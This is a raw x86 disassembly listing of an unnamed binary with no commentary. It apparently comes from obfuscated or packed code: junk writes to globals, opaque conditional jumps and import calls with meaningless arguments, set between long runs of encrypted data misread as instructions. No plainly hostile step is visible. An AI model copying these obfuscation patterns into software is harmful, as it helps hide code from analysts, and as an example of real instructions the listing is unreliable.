  401848:	js     0x4018a0
  40184a:	sar    BYTE PTR [bx+di-0x2c],0xdc
  40184f:	test   edi,ecx
  401851:	in     al,0x24
  401853:	adc    DWORD PTR [bp+si+0x35],eax
  401857:	aad    0xd7
  401859:	or     al,0x9b
  40185b:	loope  0x4018c8
  40185d:	outs   dx,BYTE PTR ds:[esi]
  40185e:	mov    esi,0x1b913e96
  401863:	inc    edx
  401864:	pop    esp
  401865:	sti    
  401866:	adc    BYTE PTR [ecx+ecx*2+0x77],0x8f
  40186b:	stc    
  40186c:	lods   al,BYTE PTR ds:[esi]
  40186d:	sar    BYTE PTR [edx-0x240caf45],cl
  401873:	fucomp st(0)
  401875:	pop    edx
  401876:	push   eax
  401877:	jno    0x401847
  401879:	add    al,0x19
  40187b:	lea    ebp,[edi-0x47]
  40187e:	ret    0xb630
  401881:	aas    
  401882:	(bad)  [ecx+0x551a5ccd]
  401888:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401889:	or     BYTE PTR [edx-0x5b6c3b3f],cl
  40188f:	adc    BYTE PTR ds:0x748c0428,ah
  401895:	dec    eax
  401896:	lock lock clc 
  401899:	xor    eax,0x974d7770
  40189e:	jne    0x401866
  4018a0:	adc    DWORD PTR [eax+0x2e6392fc],ecx
  4018a6:	loopne 0x4018a4
  4018a8:	jae    0x401893
  4018aa:	push   ebx
  4018ab:	dec    esp
  4018ac:	retf   
  4018ad:	pop    eax
  4018ae:	add    ecx,DWORD PTR [edi-0x53]
  4018b1:	cmp    al,0x59
  4018b3:	adc    edi,edx
  4018b5:	or     edi,DWORD PTR [edi+0x2]
  4018b8:	ror    BYTE PTR [edi-0x33],cl
  4018bb:	dec    edi
  4018bc:	(bad)  
  4018bd:	loop   0x401927
  4018bf:	nop
  4018c0:	sbb    esi,DWORD PTR [esp+ebp*1+0x6b0ffd7b]
  4018c7:	jnp    0x40187a
  4018c9:	and    cl,BYTE PTR [esi+0x40]
  4018cc:	sbb    dh,bh
  4018ce:	jns    0x4018ed
  4018d0:	jne    0x401906
  4018d2:	in     al,dx
  4018d3:	in     eax,0x6d
  4018d5:	inc    esp
  4018d6:	pop    es
  4018d7:	in     eax,0xd
  4018d9:	(bad)  
  4018db:	arpl   WORD PTR [edx+edi*2+0x47],si
  4018df:	sbb    al,0x9a
  4018e1:	inc    ecx
  4018e2:	sbb    DWORD PTR [ecx+ebx*4],0x63
  4018e6:	xor    al,0x6e
  4018e8:	sub    cl,BYTE PTR [ebx+edi*1-0x1d]
  4018ec:	gs xor eax,0x80e674e9
  4018f2:	mov    ds,ecx
  4018f4:	pop    ecx
  4018f5:	mov    ds:0x490a4ee3,eax
  4018fa:	call   0xdeaf:0xf278c307
  401901:	push   esi
  401902:	jecxz  0x401976
  401904:	adc    al,ah
  401906:	and    eax,0x1d254d31
  40190b:	xchg   DWORD PTR [ebx+0x4f],esi
  40190e:	fs add eax,0xd245ac4b
  401914:	data16 mov dl,0x4e
  401917:	xchg   esi,eax
  401918:	add    edx,0x14
  40191b:	sub    al,0x74
  40191d:	or     bh,BYTE PTR [ecx+0x628bb42a]
  401923:	stos   BYTE PTR es:[edi],al
  401924:	lods   eax,DWORD PTR ds:[esi]
  401925:	icebp  
  401926:	fidiv  DWORD PTR [esp+esi*8-0x79baf596]
  40192d:	(bad)  
  40192f:	cmp    BYTE PTR [edx-0x3dd4b9ae],dl
  401935:	mov    edx,0x31ab
  40193a:	mov    DWORD PTR [ebp-0x58],eax
  40193d:	sbb    ecx,edi
  40193f:	cmp    DWORD PTR ds:0x428277,0x0
  401946:	not    DWORD PTR ds:0x4282ef
  40194c:	mov    edi,DWORD PTR ds:0x428193
  401952:	mov    DWORD PTR ds:0x42828f,edi
  401958:	jmp    0x4019ab
  40195d:	mov    DWORD PTR ds:0x4282fb,0x77e1
  401967:	not    edi
  401969:	cmp    DWORD PTR ds:0x428277,0x0
  401970:	jge    0x401993
  401976:	push   0x637b
  40197b:	call   DWORD PTR ds:0x428d7c
  401981:	mov    edx,DWORD PTR ds:0x428397
  401987:	adc    DWORD PTR ds:0x4282ff,edx
  40198d:	and    edx,DWORD PTR ds:0x42824f
  401993:	add    DWORD PTR ds:0x42827f,edx
  401999:	mov    edi,DWORD PTR ds:0x428173
  40199f:	xor    DWORD PTR ds:0x42819b,edi
  4019a5:	and    DWORD PTR ds:0x42816b,ecx
  4019ab:	mov    DWORD PTR [ebp-0x54],ecx
  4019ae:	mov    ecx,DWORD PTR ds:0x42837b
  4019b4:	sub    ecx,DWORD PTR ds:0x42827b
  4019ba:	mov    DWORD PTR ds:0x42837b,ecx
  4019c0:	or     DWORD PTR [ebp-0x58],0xca78b059
  4019c7:	sbb    DWORD PTR ds:0x42838b,edx
  4019cd:	or     DWORD PTR [ebp-0x54],0x9c1b89e8
  4019d4:	adc    edx,edx
  4019d6:	lea    eax,[ebp+0x20]
  4019d9:	mov    DWORD PTR [ebp-0xc],eax
  4019dc:	mov    DWORD PTR ds:0x428383,0x339b
  4019e6:	mov    eax,ds:0x4223d0
  4019eb:	cmp    DWORD PTR ds:0x428267,0x0
  4019f2:	mov    edx,0x5699
  4019f7:	movzx  edx,BYTE PTR ds:0x428277
  4019fe:	mov    edi,0xa42
  401a03:	jmp    0x401a5a
  401a08:	not    edi
  401a0a:	mov    edi,0x2eea
  401a0f:	cmp    DWORD PTR ds:0x428267,0x0
  401a16:	jg     0x401a44
  401a1c:	push   0x3b91
  401a21:	push   0x428287
  401a26:	push   DWORD PTR [ebp-0x1c]
  401a29:	push   0x478c
  401a2e:	call   DWORD PTR ds:0x428e68
  401a34:	adc    ecx,ecx
  401a36:	sbb    ecx,DWORD PTR ds:0x428187
  401a3c:	neg    edx
  401a3e:	adc    ecx,DWORD PTR ds:0x428177
  401a44:	sub    DWORD PTR ds:0x428303,ecx
  401a4a:	add    DWORD PTR ds:0x428183,0x42827b
  401a54:	xor    edx,DWORD PTR ds:0x4282eb
  401a5a:	mov    ecx,DWORD PTR [ebp-0xc]
  401a5d:	mov    eax,DWORD PTR [eax]
  401a5f:	add    eax,DWORD PTR [ecx]
  401a61:	sub    DWORD PTR ds:0x428193,edi
  401a67:	mov    edi,0x329e695d
  401a6c:	mov    DWORD PTR [ebp-0x14],eax
  401a6f:	inc    edx
  401a70:	mov    eax,DWORD PTR [ebp+0x18]
  401a73:	cmp    DWORD PTR ds:0x428193,0x0
  401a7a:	mov    edx,DWORD PTR ds:0x428267
  401a80:	mov    edx,0x3ce6
  401a85:	mov    DWORD PTR ds:0x42831f,0xa37
  401a8f:	jmp    0x401ae6
  401a94:	mov    DWORD PTR ds:0x42826b,0x206f
  401a9e:	cmp    DWORD PTR ds:0x428193,0x0
  401aa5:	jg     0x401ac8
  401aab:	push   0x47a2
  401ab0:	push   0x8c73
  401ab5:	push   0x8ece
  401aba:	call   DWORD PTR ds:0x428d80
  401ac0:	sub    edx,DWORD PTR ds:0x4283a3
  401ac6:	or     edx,ecx
  401ac8:	sub    ecx,0x6960
  401ace:	mov    ecx,DWORD PTR ds:0x42838f
  401ad4:	adc    ecx,DWORD PTR ds:0x42817f
  401ada:	mov    DWORD PTR ds:0x42838f,ecx
  401ae0:	xor    edx,DWORD PTR ds:0x42817b
  401ae6:	mov    ecx,DWORD PTR [ebp+0x1c]
  401ae9:	shrd   eax,ecx,0x2
  401aed:	cmp    DWORD PTR ds:0x428163,0x0
  401af4:	mov    edx,0x4200
  401af9:	mov    DWORD PTR ds:0x428277,0x6ba0
  401b03:	mov    DWORD PTR ds:0x42818f,0x1855
  401b0d:	jmp    0x401b6b
  401b12:	mov    DWORD PTR ds:0x42816f,0x2fa6
  401b1c:	cmp    DWORD PTR ds:0x428163,0x0
  401b23:	jge    0x401b53
  401b29:	push   DWORD PTR [ebp-0x28]
  401b2c:	push   DWORD PTR [ebp-0x20]
  401b2f:	push   0x672f
  401b34:	call   DWORD PTR ds:0x428ed0
  401b3a:	movzx  edx,WORD PTR ds:0x42829f
  401b41:	and    edx,DWORD PTR ds:0x42817b
  401b47:	mov    DWORD PTR ds:0x42829f,edx
  401b4d:	and    DWORD PTR ds:0x428257,edx
  401b53:	add    DWORD PTR ds:0x42839b,edx
  401b59:	sub    edx,DWORD PTR ds:0x4282a3
  401b5f:	add    DWORD PTR ds:0x42825b,edi
  401b65:	or     edx,DWORD PTR ds:0x428387
  401b6b:	shr    ecx,0x2
  401b6e:	mov    ecx,DWORD PTR [ebp+0x18]
  401b71:	cmp    DWORD PTR ds:0x42830b,0x0
  401b78:	mov    DWORD PTR ds:0x4282a3,0x3b05
  401b82:	mov    edx,0x7243
  401b87:	mov    DWORD PTR ds:0x428173,0x6e0d
  401b91:	jmp    0x401bec
  401b96:	mov    edx,0x2e5f
  401b9b:	mov    edx,DWORD PTR ds:0x428247
  401ba1:	cmp    DWORD PTR ds:0x42830b,0x0
  401ba8:	je     0x401be0
  401bae:	push   DWORD PTR [ebp-0x18]
  401bb1:	push   DWORD PTR [ebp-0x20]
  401bb4:	push   DWORD PTR [ebp-0x10]
  401bb7:	push   0x15fe
  401bbc:	push   0x400000
  401bc1:	call   DWORD PTR ds:0x428d94
  401bc7:	sub    DWORD PTR ds:0x4282f7,ecx
  401bcd:	movzx  edx,WORD PTR ds:0x42825b
  401bd4:	add    DWORD PTR ds:0x428307,edx
  401bda:	add    DWORD PTR ds:0x42815f,ebx
  401be0:	sbb    DWORD PTR ds:0x42822f,edi
  401be6:	inc    DWORD PTR ds:0x42822f
  401bec:	mov    edx,DWORD PTR [ebp+0x1c]
  401bef:	xor    eax,edi
  401bf1:	xor    edx,edx
  401bf3:	or     DWORD PTR ds:0x428393,0x428237
  401bfd:	or     edx,eax
  401bff:	jmp    0x401fdd
  401c04:	xchg   ebp,eax
  401c05:	xchg   ecx,eax
  401c06:	je     0x401c58
  401c08:	ins    BYTE PTR es:[edi],dx
  401c09:	sub    al,0x2d
  401c0b:	dec    esp
  401c0c:	and    eax,0xcbb0afeb
  401c11:	loope  0x401bf2
  401c13:	jle    0x401c3a
  401c15:	or     bl,BYTE PTR [eax]
  401c17:	sbb    BYTE PTR [esi-0x48e7e7ee],bl
  401c1d:	cmp    al,0x35
  401c1f:	stc    
  401c20:	fcmovnbe st,st(7)
  401c22:	dec    edx
  401c23:	mov    BYTE PTR [ebp-0x4e3bcf36],bh
  401c29:	xor    BYTE PTR [eax-0x32],0xd2
  401c2d:	stos   DWORD PTR es:[edi],eax
  401c2e:	in     al,0xde
  401c30:	mov    eax,ds:0x972e5e12
  401c35:	pop    ebp
  401c36:	push   edx
  401c37:	retf   
  401c38:	inc    ebx
  401c39:	std    
  401c3a:	adc    ebp,DWORD PTR [ebp+0x455b13da]
  401c40:	or     DWORD PTR [eax+0x978be03],esi
  401c46:	shl    ebp,cl
  401c48:	or     eax,0xfa72d1b6
  401c4d:	inc    edx
  401c4e:	out    dx,al
  401c4f:	int3   
  401c50:	dec    esi
  401c51:	scas   eax,DWORD PTR es:[edi]
  401c52:	outs   dx,BYTE PTR ds:[esi]
  401c53:	outs   dx,DWORD PTR ds:[esi]
  401c54:	loope  0x401c21
  401c56:	mov    esp,0xa59e6dca
  401c5b:	pop    ebp
  401c5c:	fwait
  401c5d:	cmp    eax,0x5de73b23
  401c62:	das    
  401c63:	ret    
  401c64:	push   eax
  401c65:	mov    esi,DWORD PTR [esi+ebp*1-0x73c579b9]
  401c6c:	cmp    DWORD PTR [edx+0x5af6e4a5],0x4ae0ccbc
  401c76:	pop    eax
  401c77:	and    al,0xcd
  401c79:	jno    0x401c19
  401c7b:	popa   
  401c7c:	fwait
  401c7d:	(bad)  
  401c7e:	pop    edx
  401c7f:	in     eax,dx
  401c80:	std    
  401c81:	sub    ebp,ecx
  401c83:	mov    eax,0x302636bb
  401c88:	les    edx,FWORD PTR ds:0x24d38bfd
  401c8e:	ds je  0x401c57
  401c91:	jmp    0x1ebe:0x262e6be1
  401c98:	js     0x401cf2
  401c9a:	mov    al,0xca
  401c9c:	sti    
  401c9d:	fsubr  DWORD PTR [ecx]
  401c9f:	push   edi
  401ca0:	outs   dx,DWORD PTR ds:[esi]
  401ca1:	mov    ch,0x8b
  401ca3:	fsubr  QWORD PTR [ebx+0x0]
  401ca6:	bound  ecx,QWORD PTR [eax+eax*4]
  401ca9:	retf   0xd014
  401cac:	mov    bl,0x2e
  401cae:	inc    ebp
  401caf:	mov    ds:0xa80d996e,al
  401cb4:	adc    al,0x44
  401cb6:	xchg   edi,eax
  401cb7:	pop    ebp
  401cb8:	inc    edx
  401cb9:	add    ebp,DWORD PTR [edi-0xa]
  401cbc:	jbe    0x401c4f
  401cbe:	mov    ecx,0x472f3a59
  401cc3:	xor    esp,edi
  401cc5:	or     DWORD PTR [ebx],ecx
  401cc7:	jl     0x401cf6
  401cc9:	test   BYTE PTR [ebx+0x77],dh
  401ccc:	push   cs
  401ccd:	jb     0x401d3e
  401ccf:	xchg   edi,eax
  401cd0:	push   eax
  401cd1:	repz jmp 0xb62ca32e
  401cd7:	xchg   ecx,esi
  401cd9:	xlat   BYTE PTR ds:[ebx]
  401cda:	loopne 0x401cf2
  401cdc:	aad    0x0
  401cde:	clc    
  401cdf:	push   ss
  401ce0:	push   ebp
  401ce1:	cmp    BYTE PTR [eax+0x37],dh
  401ce4:	retf   
  401ce5:	mov    BYTE PTR [eax],ch
  401ce7:	popf   
  401ce8:	(bad)  
  401ce9:	repnz sub al,0xa3
  401cec:	loop   0x401d0b
  401cee:	mov    ch,0xd2
  401cf0:	retf   
  401cf1:	outs   dx,BYTE PTR ds:[esi]
  401cf2:	mov    ah,0xbe
  401cf4:	push   esp
  401cf5:	push   ebx
  401cf6:	ret    0x5af0
  401cf9:	(bad)  
  401cfa:	shr    BYTE PTR [ebx+0x4f],cl
  401cfd:	add    edx,ecx
  401cff:	ret    0x3cd8
  401d02:	int    0x31
  401d04:	add    al,0x9
  401d06:	and    eax,0x5e6b9aa7
  401d0b:	adc    BYTE PTR [ecx+edx*4-0x7085e68b],bh
  401d12:	mov    ebx,0xe2090760
  401d17:	xchg   edx,eax
  401d18:	push   ss
  401d19:	jle    0x401cf1
  401d1b:	popf   
  401d1c:	and    BYTE PTR [esi-0x51],dh
  401d1f:	pop    es
  401d20:	retf   
  401d21:	lds    esp,FWORD PTR [ebp+0x7a]
  401d24:	imul   eax,DWORD PTR ds:0x2044d574,0x48
  401d2b:	adc    edi,DWORD PTR [edi+0x5d2a0658]
  401d31:	mov    bh,0x7d
  401d33:	hlt    
  401d34:	int3   
  401d35:	sub    DWORD PTR [ebp-0x16707b1],edi
  401d3b:	jl     0x401cc4
  401d3d:	ja     0x401d6d
  401d3f:	dec    eax
  401d40:	jle    0x401d9d
  401d42:	pushf  
  401d43:	mov    bh,0xcc
  401d45:	rcr    BYTE PTR [edi],0x69
  401d48:	out    0x1a,al
  401d4a:	cmc    
  401d4b:	adc    DWORD PTR [edx+0x32f9100e],esp
  401d51:	(bad)  
  401d52:	pop    ecx
  401d53:	mov    ds:0x1fa52c,al
  401d58:	in     eax,0xc5
  401d5a:	sub    bl,dh
  401d5c:	xor    cl,BYTE PTR [edi-0x6a]
  401d5f:	push   edx
  401d60:	popa   
  401d61:	add    BYTE PTR [esi+0x57],0x4d
  401d65:	int    0xde
  401d67:	mov    esp,0x1e1a0e00
  401d6c:	pop    esp
  401d6d:	lock aas 
  401d6f:	jmp    0xd093a5f9
  401d74:	sub    ecx,DWORD PTR [ebx-0x15f8f48a]
  401d7a:	or     eax,0xf13189a3
  401d7f:	add    eax,0x419c65b9
  401d84:	enter  0x443,0xc8
  401d88:	or     BYTE PTR [esi],ah
  401d8a:	sub    BYTE PTR gs:[edx],0xf4
  401d8e:	pop    es
  401d8f:	pop    edi
  401d90:	xchg   edx,eax
  401d91:	das    
  401d92:	lahf   
  401d93:	fs inc esi
  401d95:	pop    esi
  401d96:	pop    edi
  401d97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d98:	ss push ebp
  401d9a:	mov    dh,0x97
  401d9c:	xor    dh,bl
  401d9e:	add    eax,0x52ea7b27
  401da3:	pop    edx
  401da4:	dec    eax
  401da5:	nop
  401da6:	xchg   esi,eax
  401da7:	or     eax,ebx
  401da9:	xor    ebp,DWORD PTR [edx+0x31]
  401dac:	loope  0x401da3
  401dae:	push   edx
  401daf:	sbb    eax,0x2ccb4a7d
  401db4:	pop    esp
  401db5:	mov    ecx,0xda480c16
  401dba:	add    eax,DWORD PTR [esi]
  401dbc:	data16 rcl BYTE PTR [ecx-0x6addbfd1],1
  401dc3:	jns    0x401df0
  401dc5:	nop
  401dc6:	mov    ds:0xab594830,eax
  401dcb:	add    ch,dh
  401dcd:	cmp    ebx,DWORD PTR [eax+0x2e]
  401dd0:	inc    edx
  401dd1:	and    DWORD PTR [ebp-0x71],eax
  401dd4:	aam    0x91
  401dd6:	imul   esi,DWORD PTR [edi+0x3a],0x21a1b635
  401ddd:	data16 inc sp
  401de0:	call   0x4044:0x5098605d
  401de7:	inc    edi
  401de8:	push   esp
  401de9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401dea:	dec    edx
  401deb:	loop   0x401dc7
  401ded:	lea    esp,[ebp-0x37]
  401df0:	xchg   esp,eax
  401df1:	mov    dl,0x3
  401df3:	pop    ebx
  401df4:	xor    DWORD PTR [ebx-0x51dc293a],0x3ffebf8a
  401dfe:	adc    eax,0xd2cb4fb2
  401e03:	mov    edx,0x4d64d9da
  401e08:	xchg   BYTE PTR [ebx-0x3944555b],dl
  401e0e:	ret    
  401e0f:	mov    ecx,0x7dd14178
  401e14:	jno    0x401e91
  401e16:	adc    ebx,DWORD PTR [ebx+0x512b4faf]
  401e1c:	inc    edi
  401e1d:	or     ch,bl
  401e1f:	(bad)  
  401e20:	out    dx,eax
  401e21:	je     0x401da6
  401e23:	jl     0x401dfe
  401e25:	sbb    BYTE PTR [edi+0x53ad8422],0x53
  401e2c:	dec    ecx
  401e2d:	mov    ds:0x9a3e44d3,al
  401e32:	repnz mov ecx,0xc2ce3b42
  401e38:	pop    esp
  401e39:	outs   dx,DWORD PTR ds:[esi]
  401e3a:	out    0xca,eax
  401e3c:	mov    ds,ebx
  401e3e:	or     BYTE PTR [edi-0x21],dl
  401e41:	jb     0x401dfd
  401e43:	sub    ch,BYTE PTR [edi+0xf]
  401e46:	clc    
  401e47:	mov    edi,0x1847f667
  401e4c:	jp     0x401e9c
  401e4e:	adc    BYTE PTR [ecx],ch
  401e50:	sbb    al,0x8f
  401e52:	cwde   
  401e53:	lods   eax,DWORD PTR ds:[esi]
  401e54:	cmp    al,0xd4
  401e56:	stc    
  401e57:	push   esp
  401e58:	enter  0x84f1,0x5b
  401e5c:	add    al,0x1e
  401e5e:	rcl    BYTE PTR [eax+ecx*4],0x3e
  401e62:	rol    DWORD PTR [esp+edx*4+0x11],0xd
  401e67:	out    dx,al
  401e68:	hlt    
  401e69:	idiv   ch
  401e6b:	out    dx,al
  401e6c:	xchg   ebp,eax
  401e6d:	lods   al,BYTE PTR ds:[esi]
  401e6e:	pop    esp
  401e6f:	retf   
  401e70:	aam    0xe4
  401e72:	cwde   
  401e73:	jbe    0x401e8e
  401e75:	or     al,0x95
  401e77:	inc    ecx
  401e78:	js     0x401ec3
  401e7a:	clc    
  401e7b:	adc    bl,BYTE PTR [edx+0x76d630ab]
  401e81:	fcomi  st,st(6)
  401e83:	(bad)  
  401e84:	pop    ds
  401e85:	test   BYTE PTR [edi-0x10],ch
  401e88:	pop    esi
  401e89:	xchg   BYTE PTR [ebx],bh
  401e8b:	loop   0x401e3f
  401e8d:	sbb    al,0xce
  401e8f:	cdq    
  401e90:	pop    ds
  401e91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401e92:	iret   
  401e93:	dec    esp
  401e94:	pop    es
  401e95:	push   ecx
  401e96:	inc    esi
  401e97:	or     DWORD PTR [ecx-0xa76d551],0x58101db0
  401ea1:	int3   
  401ea2:	jge    0x401f1a
  401ea4:	arpl   WORD PTR [ebx],si
  401ea6:	retf   0x5eb7
  401ea9:	shr    BYTE PTR [esi],1
  401eab:	jmp    0xc74613ae
  401eb0:	stc    
  401eb1:	dec    ebx
  401eb2:	add    ebp,DWORD PTR [edi-0x46]
  401eb5:	mov    esi,0x7ca91068
  401eba:	cmc    
  401ebb:	fwait
  401ebc:	ss dec ecx
  401ebe:	dec    esi
  401ebf:	dec    eax
  401ec0:	std    
  401ec1:	(bad)  
  401ec2:	xor    eax,0xd5652018
  401ec7:	cdq    
  401ec8:	cmp    BYTE PTR [esi+0xa],cl
  401ecb:	scas   eax,DWORD PTR es:[edi]
  401ecc:	push   ebp
  401ecd:	js     0x401e59
  401ecf:	pushf  
  401ed0:	rol    DWORD PTR [ebx-0x72],cl
  401ed3:	js     0x401e6a
  401ed5:	sbb    BYTE PTR [ebp+0x45],0x66
  401ed9:	fcom   QWORD PTR [esi-0x6c]
  401edc:	scas   eax,DWORD PTR es:[edi]
  401edd:	inc    esi
  401ede:	push   ecx
  401edf:	cmp    esi,DWORD PTR [edi+eax*2+0x3d]
  401ee3:	ins    BYTE PTR es:[edi],dx
  401ee4:	cmp    ecx,eax
  401ee6:	mov    WORD PTR [ebp+esi*1-0x736c204],?
  401eed:	sub    ch,BYTE PTR [edi-0x50]
  401ef0:	xchg   edi,eax
  401ef1:	shl    edx,cl
  401ef3:	call   0xef8f:0x50d0c9a
  401efa:	cmp    DWORD PTR [edi+0x5c],edi
  401efd:	mov    bl,0x8
  401eff:	mov    ds:0xfee803be,eax
  401f04:	sbb    eax,0x4283348
  401f09:	inc    ecx
  401f0a:	lods   al,BYTE PTR ds:[esi]
  401f0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401f0c:	aaa    
  401f0d:	mov    ds:0xccacb8c4,al
  401f12:	stos   BYTE PTR es:[edi],al
  401f13:	xchg   bl,cl
  401f15:	xor    bl,BYTE PTR [ebx+0x4bc82968]
  401f1b:	jne    0x401f2e
  401f1d:	mov    eax,ds:0x95b1bf28
  401f22:	xchg   ecx,eax
  401f23:	inc    ebx
  401f24:	ins    BYTE PTR es:[edi],dx
  401f25:	mov    esp,0x6d4100b0
  401f2a:	addr16 push edi
  401f2c:	push   ds
  401f2d:	add    al,0xd2
  401f2f:	cmp    eax,0x786dd56d
  401f34:	pusha  
  401f35:	jo     0x401f41
  401f37:	jl     0x401f2c
  401f39:	push   esp
  401f3a:	repz add BYTE PTR [edi],al
  401f3d:	fidivr WORD PTR [eax-0x2b]
  401f40:	or     bl,BYTE PTR [esi]
  401f42:	push   ebx
  401f43:	cmc    
  401f44:	adc    esp,DWORD PTR [edx]
  401f46:	lods   al,BYTE PTR ds:[esi]
  401f47:	pop    esp
  401f48:	sti    
  401f49:	leave  
  401f4a:	in     eax,0x20
  401f4c:	loope  0x401f93
  401f4e:	inc    ecx
  401f4f:	add    ebx,eax
  401f51:	add    DWORD PTR [eax+edi*1],ebp
  401f54:	mov    BYTE PTR [edx],ch
  401f56:	sub    BYTE PTR [edi-0x280eaee3],al
  401f5c:	push   0x374b5443
  401f61:	test   eax,0xedfb613d
  401f66:	loopne 0x401eee
  401f68:	in     al,0xcf
  401f6a:	push   cs
  401f6b:	mov    bl,0x80
  401f6d:	xchg   edx,eax
  401f6e:	out    0x11,eax
  401f70:	fwait
  401f71:	mov    al,0x1b
  401f73:	adc    eax,0x56f51d04
  401f78:	ror    BYTE PTR [ecx-0x4b],1
  401f7b:	in     eax,0x6e
  401f7d:	cwde   
  401f7e:	xor    eax,0x41a23347
  401f83:	jmp    0x9afa7328
  401f88:	pmaxub mm1,mm5
  401f8b:	jns    0x401f9a
  401f8d:	ret    
  401f8e:	repnz or DWORD PTR [ecx],ebx
  401f91:	(bad)  
  401f92:	out    dx,al
  401f93:	std    
  401f94:	(bad)  
  401f95:	js     0x401f9e
  401f97:	mov    ecx,0x1f5235dc
  401f9c:	mov    dl,0xd8
  401f9e:	inc    eax
  401f9f:	xchg   BYTE PTR [edi],dl
  401fa1:	xchg   ebp,eax
  401fa2:	add    eax,0x1f73cc2a
  401fa7:	jp     0x401f30
  401fa9:	xor    ecx,DWORD PTR [ecx+0x47964e73]
  401faf:	jne    0x401fa2
  401fb1:	mov    dh,0xd3
  401fb3:	(bad)  
  401fb4:	fbstp  TBYTE PTR [ebx]
  401fb6:	test   DWORD PTR [eax-0x2],0xc40ad700
  401fbd:	and    al,0x2a
  401fbf:	out    0x13,eax
  401fc1:	out    dx,eax
  401fc2:	jae    0x401fc7
  401fc4:	sbb    eax,0x7854f480
  401fc9:	mov    ebp,0x4b045156
  401fce:	and    ebx,DWORD PTR [ebp+0x12]
  401fd1:	adc    edx,DWORD PTR [ebx]
  401fd3:	sar    BYTE PTR [edi+0x51ee2f33],0xee
  401fda:	stos   DWORD PTR es:[edi],eax
  401fdb:	fdivrp st(6),st
  401fdd:	mov    DWORD PTR [ebp-0x3c],edx
  401fe0:	mov    DWORD PTR [ebp-0x70],0x2c55
  401fe7:	mov    eax,ds:0x42836b
  401fec:	adc    DWORD PTR ds:0x4283a7,eax
  401ff2:	mov    DWORD PTR [ebp-0x6c],0x456f
  401ff9:	cmp    DWORD PTR ds:0x42838b,0x0
  402000:	mov    DWORD PTR ds:0x42828b,0x4df8
  40200a:	mov    DWORD PTR ds:0x428373,0x33aa
  402014:	jmp    0x402076
  402019:	mov    eax,0x569b
  40201e:	mov    eax,0x2370
  402023:	cmp    DWORD PTR ds:0x42838b,0x0
  40202a:	jbe    0x40205c
  402030:	push   DWORD PTR [ebp-0xc]
  402033:	push   0x3ea9
  402038:	call   DWORD PTR ds:0x428d98
  40203e:	or     DWORD PTR ds:0x42816f,0x6f29
  402048:	xor    DWORD PTR ds:0x42830b,0x4282ff
  402052:	add    DWORD PTR ds:0x42828b,0x428327
  40205c:	and    DWORD PTR ds:0x42839b,edi
  402062:	mov    DWORD PTR ds:0x42827b,0x2a04
  40206c:	sub    DWORD PTR ds:0x42819b,0x42815b
  402076:	mov    DWORD PTR [ebp-0x70],0x78a6
  40207d:	cmp    DWORD PTR ds:0x4282ef,0x0
  402084:	mov    DWORD PTR ds:0x4282eb,ecx
  40208a:	mov    DWORD PTR ds:0x428197,0x59f
  402094:	mov    DWORD PTR ds:0x428197,ecx
  40209a:	mov    DWORD PTR ds:0x428317,0x5800
  4020a4:	jmp    0x402119
  4020a9:	mov    eax,0x445d
  4020ae:	cmp    DWORD PTR ds:0x4282ef,0x0
  4020b5:	ja     0x4020ec
  4020bb:	push   0x42816b
  4020c0:	push   DWORD PTR [ebp-0x10]
  4020c3:	push   0x842c
  4020c8:	call   DWORD PTR ds:0x428ed4
  4020ce:	sbb    DWORD PTR ds:0x42837b,0x4ff2
  4020d8:	xor    DWORD PTR ds:0x4282fb,0x42826f
  4020e2:	adc    DWORD PTR ds:0x42836f,0x4c73
  4020ec:	add    DWORD PTR ds:0x42836f,0x42839f
  4020f6:	and    DWORD PTR ds:0x428157,0x428373
  402100:	sbb    DWORD PTR ds:0x42815b,0x5f9d
  40210a:	sbb    DWORD PTR ds:0x4282ef,0x42829f
  402114:	sbb    eax,0x5252
  402119:	mov    DWORD PTR [ebp-0x6c],0x188
  402120:	neg    eax
  402122:	mov    DWORD PTR [ebp-0x70],0x5b3f
  402129:	mov    DWORD PTR [ebp-0x6c],0x3219
  402130:	mov    DWORD PTR [ebp-0x70],0x231c
  402137:	mov    eax,ds:0x4282eb
  40213c:	add    DWORD PTR ds:0x428287,eax
  402142:	mov    DWORD PTR [ebp-0x6c],0x1337
  402149:	mov    eax,ds:0x42837b
  40214e:	add    DWORD PTR ds:0x428317,eax
  402154:	mov    DWORD PTR [ebp-0x70],0x7593
  40215b:	cmp    DWORD PTR ds:0x428167,0x0
  402162:	mov    DWORD PTR ds:0x42838b,0x750f
  40216c:	not    DWORD PTR ds:0x428373
  402172:	jmp    0x4021e4
  402177:	mov    DWORD PTR ds:0x42826b,0x610f
  402181:	mov    eax,ds:0x42817f
  402186:	cmp    DWORD PTR ds:0x428167,0x0
  40218d:	jle    0x4021c5
  402193:	push   0x428069
  402198:	push   DWORD PTR [ebp-0x28]
  40219b:	push   0x1818
  4021a0:	push   DWORD PTR [ebp-0x18]
  4021a3:	push   0x8e39
  4021a8:	push   DWORD PTR [ebp-0x1c]
  4021ab:	call   DWORD PTR ds:0x428e70
  4021b1:	adc    DWORD PTR ds:0x42828f,0x428263
  4021bb:	add    DWORD PTR ds:0x42824f,0x168f
  4021c5:	sub    DWORD PTR ds:0x4282f3,0x428193
  4021cf:	or     DWORD PTR ds:0x428393,0xa53
  4021d9:	mov    eax,ds:0x428247
  4021de:	xor    DWORD PTR ds:0x42815b,eax
  4021e4:	mov    DWORD PTR [ebp-0x6c],0x11b8
  4021eb:	xor    eax,0x39f6
  4021f0:	jmp    0x4025ce
  4021f5:	stos   DWORD PTR es:[edi],eax
  4021f6:	fisttp QWORD PTR [edi+0x32]
  4021f9:	aas    
  4021fa:	and    ch,BYTE PTR [edx-0x2c2c85a4]
  402200:	mov    esp,0xbeec810a
  402205:	stos   DWORD PTR es:[edi],eax
  402206:	add    bl,BYTE PTR [eax]
  402208:	sbb    BYTE PTR [esi-0x47e7e7ee],bl
  40220e:	mov    esp,0x4d4ef85b
  402213:	ins    DWORD PTR es:[edi],dx
  402214:	scas   eax,DWORD PTR es:[edi]
  402215:	jmp    FWORD PTR [edx+0xe]
  402218:	pop    es
  402219:	fs (bad) 
  40221b:	jmp    0x2b9d:0x6944a904
  402222:	cmp    BYTE PTR [ecx-0xd72b992],ah
  402228:	mov    ebp,0x5f7a89a5
  40222d:	sbb    BYTE PTR [eax+0x43],cl
  402230:	fs das 
  402232:	xor    al,0xa1
